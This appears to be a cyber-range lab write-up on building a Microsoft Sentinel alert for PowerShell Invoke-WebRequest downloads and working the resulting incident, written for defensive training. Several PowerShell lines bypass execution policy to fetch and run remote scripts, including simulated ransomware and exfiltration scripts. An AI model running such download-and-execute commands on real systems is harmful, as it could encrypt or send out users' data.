# Creating An Alert Rule In Sentinel — Detecting Malicious PowerShell Web Requests in Sentinel

## Explanation

Sometimes when a bad actor gains access to a system, they attempt to download malicious payloads or tools from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity.

By leveraging commands such as `Invoke-WebRequest`, attackers can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling malware deployment, data exfiltration, or communication with a C2 server.

Detecting this behavior is critical to identifying and disrupting an ongoing attack.

When processes are executed on a local VM, logs are captured in Microsoft Defender for Endpoint under the `DeviceProcessEvents` table. These logs are forwarded to the Log Analytics Workspace used by Microsoft Sentinel. Within Sentinel, we define an alert to trigger when PowerShell is used to download a remote file.

---

## Part 1: Create Alert Rule (PowerShell Suspicious Web Request)

We’ll define a Scheduled Query Rule in Sentinel to discover when PowerShell is detected using `Invoke-WebRequest` to download content.

```kql
let TargetHostname = "windows-target-1"; 

DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by Timestamp
```

Once your query returns expected results, create the Scheduled Query Rule in:

**Microsoft Sentinel → Analytics → Scheduled Query Rule**

<img width="1414" alt="image" src="https://github.com/user-attachments/assets/5c6f03ea-08cb-470e-9c35-0002b9105485">


### Analytics Rule Settings

- **Name**: PowerShell Suspicious Web Request
- **Description**: Detects PowerShell execution with Invoke-WebRequest to download files from the internet.
- **Enabled**: Yes
- **Run frequency**: Every 4 hours
- **Lookup data for**: Last 24 hours
- **Stop running query after alert is generated**: Yes

### Entity Mapping

| Entity    | Identifier   | Value                |
|-----------|--------------|----------------------|
| Account   | Name         | AccountName          |
| Host      | HostName     | DeviceName           |
| Process   | CommandLine  | ProcessCommandLine   |

- Automatically create an **Incident** if the rule is triggered.
- Group all alerts into a single Incident per 24 hours.

---

## Part 2: Trigger Alert to Create Incident

If your VM is onboarded to Microsoft Defender for Endpoint and has been running for several hours, the attack simulator will have already generated necessary logs.

If not, simulate the behavior by executing the following PowerShell commands on your VM:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

Note: Do not confuse Sentinel's **Configuration → Analytics** section with **Threat Management → Incidents**

---

## Part 3: Work the Incident

Work the incident to completion, following the **NIST 800-61 Incident Response Lifecycle**.

### Preparation

- Documented roles, responsibilities, and procedures.
- Ensured tools, systems, and training were in place.

### Detection and Analysis

- Identified and validated the incident.
- Observed the incident and assigned it to myself; set status to **Active**.
- Investigated using **Actions → Investigate**.
- Gathered evidence and assessed the impact.


<img width="1414" alt="image" src="https://github.com/user-attachments/assets/74acdee3-2e22-442d-b7c2-315d0878e105">


Example simulated commands found on `windows-target-1`:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
```

I ran this query to find first occurrences:

```kql
let TargetHostname = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by Timestamp asc
```

While I noticed they’d been run everyday, the results stopped at 30 days prior.  This is consistent with our data retention limit of 30 days in Microsoft Defender for Endpoints.  I spoke with the employee who uses the machine to investigate what could have triggered these scripts being downloaded.  He explained that he had been downloading some updated work software at the start of the year over the course of several days from unofficial sources due to expired licensing.

 <img width="1414" alt="image" src="https://github.com/user-attachments/assets/ebcae9e0-df2c-48bc-853e-7d1607abc5e1">


I ran the following query to check whether scripts were executed:

```kql
let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by Timestamp asc
| project Timestamp, AccountName, DeviceName, FileName, ProcessCommandLine
```

#### Outcome

Scripts were executed multiple times on or before April 7, 2025.

---

### Script Function Summaries

| Script Name         | Description                                                                 |
|---------------------|-----------------------------------------------------------------------------|
| `portscan.ps1`      | Scans IP ranges for open ports and logs results                             |
| `pwncrypt.ps1`      | Simulates ransomware by encrypting Desktop files and creating a ransom note |
| `eicar.ps1`         | Creates an EICAR test file for AV testing                                   |
| `exfiltratedata.ps1`| Generates fake data, compresses, and uploads to Azure Blob (exfiltration)   |

---

## Containment, Eradication, and Recovery

- Isolated device in Microsoft Defender for Endpoint.
- Ran anti-malware scan.
- Submtited ticket to request system reimage despite malware being removed, out of an abundance of caution.

---

## Post-Incident Activities

- Recommended additional Cyber Awareness training for employee.
- Created a Shadow IT training module for all users.
- Initiated cross-team collaboration to verify only approved, up-to-date software was present in the environment.
- Recommended changing MDE data retention policy to 6 months.
- Suggested restricting PowerShell access for non-essential users.

# Post-Incident Activities

**Final Review and Closure**
- **Incident Review**
  - Malicious scripts were confirmed and the system was remediated.
- **Final Report**
  - Documented the incident lifecycle, including steps taken, findings, and recommendations for future prevention
- **Incident Closure**
  - Closed the incident in Microsoft Sentinel as a “True Positive” after resolving the issue and documenting the response
    
<img width="1414" alt="image" src="https://github.com/user-attachments/assets/3aa59cc6-cb54-4678-b845-8ca1a4807170">

- **Documented Findings**
  - Recorded notes within the incident
  - Detailed steps taken during the investigation and response
  
- **Lessons Learned**
  - The need for improved detection processes for PowerShell abuse.
  - The org is vulnerable to Shadow IT.
  - Used this incident to strengthen threat detection and response capabilities.

- **Evidence Retention**
  - Studied incident characteristics to identify systemic weaknesses and threats, and incident trends

- **Using Collected Incident Data**
  - Retained evidence in accordance with organizational standards and industry regulations

---

## MITRE ATT&CK Mappings

- T1059.001: Command and Scripting Interpreter: PowerShell
- T1105: Ingress Tool Transfer
- T1027: Obfuscated Files or Information

   
---
### 📇 Analyst Contact

**Name**: Britt Parks\
**Contact: linkedin.com/in/brittaparks**\
**Date**: May 8, 2025

